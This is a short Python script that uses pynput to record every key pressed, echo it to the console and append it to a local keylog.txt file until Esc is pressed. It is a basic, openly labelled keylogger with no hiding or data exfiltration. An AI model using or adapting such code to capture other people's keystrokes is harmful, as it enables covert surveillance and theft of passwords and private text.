from pynput import keyboard

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        with open("keylog.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        print('special key {0} pressed'.format(key))
        with open("keylog.txt", "a") as f:
            f.write(str(key) + "\n")

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
